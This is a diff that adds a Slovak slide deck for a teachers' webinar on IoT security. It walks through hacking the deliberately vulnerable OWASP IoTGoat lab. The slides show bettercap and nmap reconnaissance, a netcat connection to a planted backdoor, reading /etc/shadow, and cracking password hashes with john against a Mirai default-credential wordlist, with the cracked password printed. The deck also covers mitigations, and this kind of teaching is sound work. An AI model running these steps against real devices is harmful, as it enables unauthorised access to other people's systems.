@@ -1,0 +1,378 @@
+---
+title: Písmeno B v skratke IoT znamená bezpečnosť
+description: |
+  Áno, je to tak. Písmeno B v skratke IoT je vyhradené pre bezpečnosť. A celý vtip je práve v tom, že tak, ako v skratke IoT nenájdete písmeno B, tak je otázka bezpečnosti v tejto oblasti veľmi podceňovaná. V tomto webinári sa preto pozrieme prakticky na hackovanie IoT zariadení, počas ktorého si predstavíme a ozrejmíme dopad niektorých hrozieb z projektu OWASP IoT Top 10.
+
+duration: 50
+date: 2025-03-26
+layout: slide
+event:
+    title: Klub učiteľov informatiky
+    # url: https://abbsolutionsslovakia.com/
+categories: talk
+theme: night
+authors:
+    - name: Miroslav 'mirek' Biňas
+      email: mirek@cnl.sk
+      url: https://bletvaska.github.io
+# bitly: https://bit.ly/4iE06cA
+# video: https://youtu.be/-Nue8zK_JVc
+---
+
+<style>
+#kali-linux img {
+  height: 500px;
+}
+
+#bettercap img {
+  height: 400px;
+}
+
+#cracking-with-john code {
+  font-size: 0.7em;
+}
+
+#full-port-scanning code {
+  font-size: 0.9em;
+}
+</style>
+
+
+{% include first.slide.html %}
+
+
+<section id="mirek" data-markdown>
+![thats me](images/mirek.jpg)
+</section>
+
+
+<section id="kpi" data-markdown data-background="white">
+[![](images/logo-kpi.png)](https://kpi.fei.tuke.sk/)
+
+notes:
+* posobim na katedre pocitacov a informatiky na fei
+* ponukame studijny program informatika a kyberbezpecnost
+</section>
+
+
+<section id="mr-robot" data-markdown data-background="images/mr.robot.png">
+> That’s not how this works. I can’t just hack a prison in a day. I need time to do research, figure out the security protocols, the layout, how the system works. -- (Eliot)
+
+notes:
+- budeme sa rozpravat o hackovani
+- ako to funguje a nefunguje celkom dobre vystihol eliot zo serialu mr. robot, ktory to opisal takto:
+  - chce to cas
+  - potrebujeme pozorovat, ako veci pracuju
+- teraz sa snazim tiez zachranovat jednu pocitacovu siet v jednej drobnej prevadzke, ku ktorej som dostal len tri loginy s heslami
+  - tak pozorujem, ako veci pracuju a ako su tie zariadenia prepojene
+</section>
+
+
+<section id="owasp-iot-top-10" data-markdown data-background="#303030">
+[![](images/owasp.iot.top.ten.jpg)](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Top_10)
+
+notes:
+</section>
+
+
+<section id="iot-devices-hacking" data-markdown>
+## Hackovanie IoT zariadení
+
+* hackovanie fyzických zariadení
+* hackovanie softvérového obrazu
+</section>
+
+
+<section id="owasp-iot-goat" data-markdown>
+[![](https://opengraph.githubassets.com/f993c8e3694331cd888fa6ca319a677984f9609bdfb5ce8bfe5bb245ac557e1e/OWASP/IoTGoat)](https://github.com/OWASP/IoTGoat)
+</section>
+
+
+<section id="docker" data-markdown data-background="white">
+[![Docker](images/docker-logo.png)](https://www.docker.com/)
+</section>
+
+
+<section id="kali-linux" data-markdown data-background="white">
+[![Kali Linux](images/kali.linux-logo.jpg)](https://www.kali.org/)
+</section>
+
+
+<section id="step-1" data-markdown>
+## 1. Pripojiť & Identifikovať zariadenie
+
+notes:
+* po kupeni si zariadenie pripojim do vlastnej siete a potrebujem zistit, aku ma ip adresu
+* na to vieme samozrejme pouzit viacero sposobov
+  * kedze je to nasa domacnost, viem sa pozriet do domaceho wifi smerovaca na zoznam pripojenych a rozdanych ip adries
+  * mozem oskenovat celu siet pomocou `nmap`-u
+  * pouzit na to specialny nastroj
+</section>
+
+
+<section id="bettercap" data-markdown data-background="white">
+[![Bettercap](images/bettercap-logo.png)](https://www.bettercap.org/)
+
+notes:
+* na zistenie ip adresy pouzijeme nastroj bettercap
+</section>
+
+<section id="bettercap-description" data-markdown>
+The Swiss Army knife for WiFi, Bluetooth Low Energy, wireless HID hijacking, CAN-bus and IPv4 and IPv6 networks reconnaissance and MITM attacks.
+
+notes:
+* na stranke maju takyto paradny popis
+</section>
+
+
+<section id="bettercap-notes" data-markdown>
+```bash
+$ bettercap
+> set ticker.commands 'clear; net.show; events.show 10'
+> net.probe on
+> ticker on
+```
+</section>
+
+
+<section id="step-2" data-markdown>
+## 2. Skenovanie portov
+
+notes:
+* potrebujeme overit, ake porty ma zariadenie otvorene
+</section>
+
+
+<section id="port-scanning" data-markdown>
+```bash
+$ nmap 192.168.0.136
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-13 12:11 CET
+Nmap scan report for 192.168.0.136
+Host is up (0.0012s latency).
+Not shown: 995 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+443/tcp  open  https
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 38.62 seconds
+```
+
+notes:
+* oskenovali sme porty na zariadeni
+</section>
+
+
+<section id="full-port-scanning" data-markdown>
+```bash
+$ nmap -nv -p- 192.168.0.136
+Completed Connect Scan at 22:32, 2788.47s elapsed (65535 total ports)
+Nmap scan report for 192.168.0.136
+Host is up (0.021s latency).
+Not shown: 65528 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+443/tcp   open  https
+5000/tcp  open  upnp
+5515/tcp  open  unknown
+65534/tcp open  unknown
+Read data files from: /usr/local/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 2788.53 seconds
+```
+notes:
+* pozor - `nmap` neoskenoval vsetky porty
+  * `nmap` oskenoval len 1000 portov
+  * neoskenoval zvysnych 65535 - 1000 = 64535
+  * na to musime `nmap` spustit inak
+* ak vsak 1k portov trvalo 40s, tak 65k portov bude trvat nasobne dlhsie
+  * 65 * 40 = 2600s = 43min
+  * ... a to si teda pockame...
+</section>
+
+
+<section id="know-your-enemy" data-markdown>
+## 3. Spoznaj svojho nepriateľa ;)
+</section>
+
+
+<section id="tooling" data-markdown>
+* konkrétne nástroje pre konkrétne služby
+  * `ssh` pre ssh
+  * `curl`, `http` pre http
+  * ...
+  * `nc`, `telnet` pre všetko ostatné ;)
+* identifikujte typ služby pomocou `getent`
+  ```bash
+  $ getent services 53
+  domain                53/tcp
+  ```
+
+notes:
+* mame tu ale par problemov:
+* s akym pouzivatelom otestujeme ssh?
+* ako testneme dns?
+* http:
+  ```bash
+  $ http 192.168.0.136:80
+  $ http 192.168.0.136:443
+  ```
+* a co je zac `5000`?
+  ```bash
+  $ getent services 5000
+  $ http 192.168.0.136:5000
+  ```
+```
+</section>
+
+
+<section id="backdoor-located" data-markdown>
+## Zadné vrátka
+
+```bash
+$ nc 192.168.0.136 5515
+[***]Successfully Connected to IoTGoat's Backdoor[***]
+```
+</section>
+
+
+<section id="insecure-network-services" data-markdown>
+## Hrozba #2. Nezabezpečené sieťové služby
+</section>
+
+
+<section id="insecure-network-services-definition" data-markdown>
+> Unneeded or insecure network services running on the device itself, especially those exposed to the internet, that compromise the confidentiality, integrity/authenticity, or availability of information or allow unauthorized remote control...
+
+notes:
+* na zariadeniach byvaju spustene aj sluzby, ktore pre beh zariadenia nie su vobec potrebne alebo su nezabezpecene
+  * napr. preco mame telnet server na chytrej ziarovke?
+* problem je nasobne vacsi, ak tieto sluzby:
+  * pouzivaju predvolene prihlasovacie udaje
+  * nepouzivaju prihlasovacie udaje vobec
+  * su dostupne z internetu
+</section>
+
+
+<section id="insecure-network-services-mitigate" data-markdown>
+### Ako zmierniť bezpečnostné riziko?
+
+* vypnúť nepotrebné služby
+* vytvoriť osobitnú sieť pre IoT riešenie
+* použiť šifrované spojenie
+   * problém na mikrokontroléroch (slabý výkon)
+</section>
+
+
+<section id="insecure-ecosystem-interfaces" data-markdown>
+## Hrozba #3. Nezabezpečené rozhrania ekosystému
+</section>
+
+
+<section id="insecure-ecosystem-interfaces-definition" data-markdown>
+> Insecure web, backend API, cloud, or mobile interfaces in the ecosystem outside of the device that allows compromise of the device or its related components. Common issues include a lack of authentication/authorization, lacking or weak encryption, and a lack of input and output filtering.
+
+notes:
+* casty problem je aj nezabezpecene komunikacne rozhranie
+  * napr. ui bez loginu/hesla
+  * napr. po pripojeni monitora a klavesnice dostanem rovno prikazovy riadok s pravami superpouzivatela
+* casty problem je aj nezabezpecena seriova linka pri mikrokontroleroch
+</section>
+
+
+<section id="insecure-ecosystem-interfaces-mitigate" data-markdown>
+### Ako zmierniť bezpečnostné riziko?
+
+* použite bezpečný a spoľahlivý autentifikačný a autorizačný mechanizmus s auditom
+   * použite existujúci systém a nevytvárajte vlastný!
+* použite šifrovanú komunikáciu
+* použite filtrovanie prichádzajúcej a odchádzajúcej sieťovej komunikácie na sieťových rozhraniach
+</section>
+
+
+<section id="get-the-job-done" data-markdown>
+## 4. Crackovanie používateľa
+</section>
+
+
+<section id="todo" data-markdown>
+* `/etc/passwd` - zoznam používateľov
+  * `root`
+  * `iotgoatuser`
+* `/etc/shadow` - hash-e hesiel
+* skúste najprv google ;)
+* použite crackery hesiel ako `john`, `hashcat`, `hydra` so [zoznamov slov](resources/mirai-botnet.txt)
+* ak je to potrebné, najprv extrahujte len heslá:
+  ```bash
+  # extract only passwords from mirai-botnet.txt
+  $ cut -d' ' -f2 mirai-botnet.txt > passwords
+  ```
+
+notes:
+* `$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1`
+* `$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.`
+</section>
+
+
+<section id="cracking-with-john" data-markdown>
+## John the Cracker
+
+```bash
+$ john --wordlist=passwords.txt shadow
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 59 candidates left, minimum 192 needed for performance.
+7ujMko0vizxv     (iotgoatuser)
+1g 0:00:00:00 DONE (2025-03-13 13:50) 20.00g/s 1180p/s 2360c/s 2360C/s xc3511..fucker
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+</section>
+
+
+<section id="last-service">
+## Otestovanie prístupu
+
+* do UI len ako `root`
+* problém s `ssh`
+* posledný port je `telnet`
+</section>
+
+
+<section id="lets-hack" data-markdown>
+## Poďme dačo pokaziť!
+
+notes:
+* hotovo. mozeme robit co chceme.
+</section>
+
+
+<section id="hacking-software-image" data-markdown>
+## Hackovanie softvérových obrazov
+
+```bash
+$ binwalk -e IoTGoat-raspberry-pi2.img
+```
+</section>
+
+
+<section id="questions" data-markdown>
+## Otázky?
+</section>
+
+
+<section id="links" data-markdown>
+## Odkazy
+
+* [IoTGoat](https://github.com/OWASP/IoTGoat)
+</section>
+
+
+{% include qr.html %}
